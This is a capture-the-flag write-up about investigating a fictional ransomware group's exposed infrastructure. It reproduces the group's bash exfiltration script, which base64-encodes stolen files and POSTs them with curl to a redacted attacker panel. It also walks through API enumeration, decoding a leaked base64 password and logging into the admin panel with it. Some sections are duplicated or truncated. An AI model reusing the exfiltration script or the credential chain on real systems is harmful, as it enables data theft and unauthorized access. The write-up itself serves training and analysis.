# 👖 Pantalones CTF — Write-up

> A CTF investigation into exposed attacker infrastructure, leaked secrets,
> poor credential handling, API enumeration, and operational security failures.

## 🎯 Objective

Investigate the Pantalones ransomware group's exposed infrastructure and
discover the hidden flag.

---

## 🧰 Skills & Techniques

- OSINT
- Web investigation
- API enumeration
- Source-code analysis
- Secret discovery
- Base64 decoding
- Credential analysis
- Authentication testing
- Threat intelligence
- Attacker OPSEC analysis

---

# 🔎 1. Initial Reconnaissance

The challenge presented a leak site containing multiple victims.

Two particularly interesting targets were:

- QuantumCore Systems
- AetherFlow Enterprises

AetherFlow was especially interesting because its leaked archive contained
not only business data but also a hidden operational script.

### Evidence
![](Screenshots/1.png)

---

# 🕵️ 2. Discovering the Hidden `.exfil.sh`

Inside the AetherFlow leak, I found:

```text
aetherflow/
├── api_keys_internal.yaml
├── route_algorithms_PROPRIETARY.sql
├── customers.sql
└── .exfil.sh

```

![](Screenshots/2.png)

# 🕵️ 3. Analysis .exfil.sh

The script revealed information about how the attackers were transferring
stolen files to their infrastructure.

It contained:

- A panel address
- An API endpoint
- An authentication header
- An upload action
- A list of files being exfiltrated
- Base64 encoding of file contents

A sanitized representation of the relevant logic looked like:

```

#!/bin/bash
# aetherflow staging dump - vex 05/30
PANEL="[REDACTED]"
KEY="[REDACTED]"

TARGETS=(
    "route_algorithms_PROPRIETARY.sql"
    "customers.sql"
    "api_keys_internal.yaml"
)

for f in "${TARGETS[@]}"; do
    [ -f "$f" ] || continue
    # dont upload ourselves lol
    [ "$f" = ".exfil.sh" ] && continue
    b64=$(base64 -w0 "$f")
    curl -s -X POST "${PANEL}/api.php?action=upload" \
        -H "X-Panel-Key: ${KEY}" \
        -d "chunk=${b64}&fname=${f}&tag=aetherflow"
    echo "[+] sent: $f"
done

# TODO: delete this before zipping

```

---

# 🌐 4. API Investigation

After identifying the API endpoint from the leaked script, I investigated
the available functionality.

The API revealed several actions:

- upload
- status
- messages
- decrypt
- wallets
- payloads
- exfil

The API became an important source of threat intelligence.

I focused on information-gathering functionality rather than destructive
operations.

![](Screenshots/3.png)

---

# 🧠 5. Attacker OPSEC Failure

The internal communications confirmed that the attackers knew about the
mistake.

One conversation revealed that the .exfil.sh file had accidentally been
included in the AetherFlow archive.

The attackers discussed the fact that the script contained their panel
information and authentication details.

One attacker argued that the file was unlikely to be discovered because it
was a dotfile.

This was a major operational-security failure.

Lesson

Hidden does not mean secure.

Files beginning with . may not appear in a normal directory listing, but
they are still part of the filesystem and should be examined during a
forensic investigation.

---

# 📊 6. API Status Information

The API status response revealed information about the attackers'
infrastructure.

It exposed details such as:

- Panel version
- Uptime
- Number of nodes
- Active campaigns
- Storage usage
- Operators currently online

This demonstrated how much information can be exposed by an improperly
secured management API.

---

# 💬 9. Internal Attacker Messages

The messages functionality was particularly valuable.

The exposed conversations contained information about:

- Victims
- Attack timelines
- Exfiltration operations
- Internal roles
- Ransom demands
- Infrastructure mistakes
- Credential handling
- Attacker concerns about OPSEC

The messages effectively provided an insider view of the operation.

![](Screenshots/

---

# 🔥 8. AetherFlow Investigation

One conversation discussed the completed AetherFlow operation.

The attackers confirmed that:

Four files had been collected
The files were chunked and verified
A ransom demand was being considered
Customer data and proprietary route-optimization information were valuable
API keys had been discovered in plaintext

This was important because it connected the leaked files to an actual
exfiltration operation.

---

# 🧩 9. The .exfil.sh Mistake

Another conversation provided one of the most important clues.

The attackers discussed the fact that the .exfil.sh file had been left
inside the published archive.

They realized that researchers could discover:

The panel address
The API endpoint
The authentication mechanism

They discussed rotating the panel key, but the response indicated that
the rotation was delayed.

This showed how a single operational mistake could expose an entire
attacker infrastructure.

---

# 💬 9. Internal Attacker Messages

The messages functionality was particularly valuable.

The exposed conversations contained information about:

- Victims
- Attack timelines
- Exfiltration operations
- Internal roles
- Ransom demands
- Infrastructure mistakes
- Credential handling
- Attacker concerns about OPSEC

The messages effectively provided an insider view of the operation.

![](Screenshots/

---

# 🔐 10. Credential Discovery

While investigating the internal messages, I found another interesting
conversation.

One attacker asked another for their FTP password after resetting their
machine.

Instead of using a secure password manager, the password was shared in the
conversation in encoded form.

The value looked like:

[REDACTED_BASE64_VALUE]

The attacker described it as "encoded."

This immediately suggested Base64.

![](Screenshots/4.png)

---

# 🧪 11. Base64 Decoding

I decoded the value using CyberChef.

The important observation was that the value was encoded, not encrypted.

Base64

Base64 is a binary-to-text encoding scheme.

It does not provide confidentiality.

Anyone who obtains a Base64-encoded password can decode it.

Example
Encoded data
     ↓
Base64 decode
     ↓
Original plaintext

This recovered the password associated with the attacker account.

![](Screenshots/13.png)

---

# 🚪 12. Discovering the Admin Panel

The Pantalones site contained an administrative interface:

admin panel


Username
Password


Authenticate

The attacker conversations had already revealed information about their
credential practices.

Using the credentials discovered during the CTF investigation, I tested
authentication against the challenge's admin panel.

The credentials were accepted.

![](Screenshots/14.png)

---

# 🖥️ 13. Admin Panel Access

After successful authentication, I reached the administrative interface.

This was the final major step in the investigation.

The important point was that the admin compromise did not require a
sophisticated exploit.

Instead, the access chain resulted from:

Poor OPSEC
     +
Credential sharing
     +
Weak encoding
     +
Exposed infrastructure

![](Screenshots/15.png)

---

# 🏁 14. Finding the Flag

The final flag was located inside the administrative panel.

🎯 Flag

```
flare{pantal0n3s_g0t_pantsed_2026}
```
![](Screenshots/8.png)
